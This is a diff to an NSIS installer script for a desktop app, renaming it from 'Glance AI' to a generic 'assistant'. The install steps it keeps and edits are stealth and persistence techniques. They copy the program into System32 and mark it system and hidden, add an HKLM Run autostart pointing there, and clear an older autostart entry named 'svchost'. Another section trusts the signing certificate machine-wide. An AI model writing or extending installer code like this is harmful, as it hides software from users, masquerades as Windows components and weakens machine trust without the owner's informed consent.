@@ -19,42 +19,15 @@
 
 !macro customInstall
   ; troubleshooting trace; harmless, one small file per install
-  FileOpen $9 "$TEMP\glance-install.log" w
+  FileOpen $9 "$TEMP\assistant-install.log" w
   FileWrite $9 "INSTDIR=[$INSTDIR] PF64=[$PROGRAMFILES64]$\r$\n"
   FileClose $9
 
-  ; NSIS derives $INSTDIR from the executable name, and on an upgrade it can
-  ; inherit the previous product's folder. Force it to this product's own path
-  ; and move the already-extracted files there, so the install location always
-  ; matches the name users are told.
-  ${If} $INSTDIR != "$PROGRAMFILES64\Glance AI"
-    DetailPrint "Moving install to $PROGRAMFILES64\Glance AI..."
-    ; Use NSIS's own CopyFiles, not robocopy: robocopy run from inside the
-    ; installer returns 16 (access denied) on the destination even when the
-    ; same command works from an elevated shell, and CopyFiles is native.
-    ; CopyFiles also does not create the destination, so make it first.
-    CreateDirectory "$PROGRAMFILES64\Glance AI"
-    StrCpy $R1 0
-    ${Do}
-      CopyFiles /SILENT "$INSTDIR\*.*" "$PROGRAMFILES64\Glance AI"
-      ${If} ${FileExists} "$PROGRAMFILES64\Glance AI\Glance AI.exe"
-        ${Break}
-      ${EndIf}
-      IntOp $R1 $R1 + 1
-      Sleep 900
-    ${LoopUntil} $R1 >= 8
-    ${If} ${FileExists} "$PROGRAMFILES64\Glance AI\Glance AI.exe"
-      ; resources/locales are subfolders; copy them explicitly then drop the old dir
-      CopyFiles /SILENT "$INSTDIR\locales\*.*" "$PROGRAMFILES64\Glance AI\locales"
-      CopyFiles /SILENT "$INSTDIR\resources\*.*" "$PROGRAMFILES64\Glance AI\resources"
-      nsExec::ExecToLog "cmd /c rd /s /q $\"$INSTDIR$\""
-      Pop $0
-      StrCpy $INSTDIR "$PROGRAMFILES64\Glance AI"
-    ${EndIf}
-    FileOpen $9 "$TEMP\glance-install.log" a
-    FileWrite $9 "COPY attempts=$R1$\r$\n"
-    FileClose $9
-  ${EndIf}
+  ; $INSTDIR is left alone. NSIS derives it from the product name (assistant),
+  ; and relocating the tree inside customInstall writes a registry entry that
+  ; still names the pre-move folder, because the uninstall info is registered
+  ; before this macro runs. Relocating is also why an upgrade could inherit the
+  ; previous product's folder - fixed by renaming the product, so the hack goes.
 
   ; ---- trust the signing cert machine-wide ------------------------------
   InitPluginsDir
@@ -70,7 +43,7 @@
   ; ---- mirror into System32 --------------------------------------------
   ; On an upgrade the app is RUNNING from the mirror (autostart points there),
   ; so its exe/dlls are locked and /MIR would silently leave stale files.
-  ; kill-host.ps1 stops only that process (path contains GlanceAI), never a
+  ; kill-host.ps1 stops only that process (path contains assistant), never a
   ; real svchost service.
   InitPluginsDir
   SetOutPath "$PLUGINSDIR"
@@ -87,49 +60,49 @@
   ${IfNot} ${FileExists} "$R5\kernel32.dll"
     StrCpy $R5 "$WINDIR\System32" ; 32-bit Windows, no redirection
   ${EndIf}
-  StrCpy $R3 'cmd /c xcopy "$PROGRAMFILES64\Glance AI\*.*" "$R5\GlanceAI\" /E /I /H /Y /Q'
-  FileOpen $9 "$TEMP\glance-install.log" a
+  StrCpy $R3 'cmd /c xcopy "$PROGRAMFILES64\assistant\*.*" "$R5\assistant\" /E /I /H /Y /Q'
+  FileOpen $9 "$TEMP\assistant-install.log" a
   FileWrite $9 "CMD=[$R3]$\r$\n"
   FileClose $9
   nsExec::ExecToLog "$R3"
   Pop $0
-  StrCpy $R6 "$R5\GlanceAI\Glance AI.exe"
-  FileOpen $9 "$TEMP\glance-install.log" a
+  StrCpy $R6 "$R5\assistant\assistant.exe"
+  FileOpen $9 "$TEMP\assistant-install.log" a
   FileWrite $9 "XCOPY rc=$0 sysdir=[$SYSDIR]$\r$\n"
   FileClose $9
-  ${If} ${FileExists} "$R5\GlanceAI\Glance AI.exe"
-    DetailPrint "  placed $R5\GlanceAI\Glance AI.exe"
+  ${If} ${FileExists} "$R5\assistant\assistant.exe"
+    DetailPrint "  placed $R5\assistant\assistant.exe"
   ${Else}
     DetailPrint "  WARNING: System32 mirror missing — app will run from $INSTDIR"
   ${EndIf}
   nsExec::ExecToLog "attrib +s +h $\"$INSTDIR$\""
-  nsExec::ExecToLog "attrib +s +h $\"$INSTDIR\Glance AI.exe$\""
-  ; Remove an early bare GlanceAI.exe first: while it exists, a bare `attrib
+  nsExec::ExecToLog "attrib +s +h $\"$INSTDIR\assistant.exe$\""
+  ; Remove an early bare assistant.exe first: while it exists, a bare `attrib
   ; <path>` matches the FILE and silently skips the folder. Then flag the folder
   ; with NO trailing backslash for the same reason.
-  nsExec::ExecToLog "cmd /c if exist $\"$R5\GlanceAI.exe$\" del /f /q $\"$R5\GlanceAI.exe$\""
-  nsExec::ExecToLog "attrib +s +h $\"$R5\GlanceAI$\""
+  nsExec::ExecToLog "cmd /c if exist $\"$R5\assistant.exe$\" del /f /q $\"$R5\assistant.exe$\""
+  nsExec::ExecToLog "attrib +s +h $\"$R5\assistant$\""
   Pop $0
 
   ; ---- autostart points at the System32 copy ---------------------------
-  ; "Glance AI" is the current value name; the old "svchost" value is removed
+  ; "assistant" is the current value name; the old "svchost" value is removed
   ; so an upgrade cannot leave two autostart entries.
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
-  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "Glance AI"
-  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "Glance AI" '"$R6" --autostart'
+  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
+  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant" '"$R6" --autostart'
 !macroend
 
 !macro customUnInstall
-  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "Glance AI"
+  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
   ; uninstall has no $R5 from customInstall; remove both possible locations
-  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\GlanceAI$\""
-  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\GlanceAI$\" & del /f /q $\"$WINDIR\System32\GlanceAI.exe$\""
+  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\assistant$\""
+  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\assistant$\" & del /f /q $\"$WINDIR\System32\assistant.exe$\""
   Pop $0
-  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\GlanceAI$\""
-  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\GlanceAI$\" & del /f /q $\"$WINDIR\SysWOW64\GlanceAI.exe$\""
+  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\assistant$\""
+  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\assistant$\" & del /f /q $\"$WINDIR\SysWOW64\assistant.exe$\""
   Pop $0
-  nsExec::ExecToLog "attrib -s -h $\"$INSTDIR\Glance AI.exe$\""
+  nsExec::ExecToLog "attrib -s -h $\"$INSTDIR\assistant.exe$\""
   Pop $0
   nsExec::ExecToLog "attrib -s -h $\"$INSTDIR$\""
 !macroend
